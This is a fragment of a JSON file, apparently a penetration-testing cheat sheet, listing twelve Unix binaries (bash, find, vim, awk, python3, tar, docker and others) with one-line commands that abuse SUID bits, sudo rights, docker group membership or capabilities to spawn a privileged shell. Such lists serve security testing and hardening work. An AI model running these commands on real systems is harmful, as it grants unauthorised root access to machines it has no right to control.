  "gtfobins": [
    { "binary": "bash",   "function": "SUID",  "command": "bash -p" },
    { "binary": "find",   "function": "SUID",  "command": "find . -exec /bin/sh -p \\; -quit" },
    { "binary": "nmap",   "function": "SUID",  "command": "nmap --interactive   # then: !sh   (old nmap only)" },
    { "binary": "vim",    "function": "sudo",  "command": "sudo vim -c ':!/bin/sh'" },
    { "binary": "less",   "function": "sudo",  "command": "sudo less /etc/profile   # then: !/bin/sh" },
    { "binary": "awk",    "function": "sudo",  "command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'" },
    { "binary": "python3","function": "sudo",  "command": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'" },
    { "binary": "perl",   "function": "sudo",  "command": "sudo perl -e 'exec \"/bin/sh\";'" },
    { "binary": "env",    "function": "sudo",  "command": "sudo env /bin/sh" },
    { "binary": "tar",    "function": "sudo",  "command": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
    { "binary": "docker", "function": "group", "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
    { "binary": "cap",    "function": "capability", "command": "cap_setuid+ep on python: python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'" }
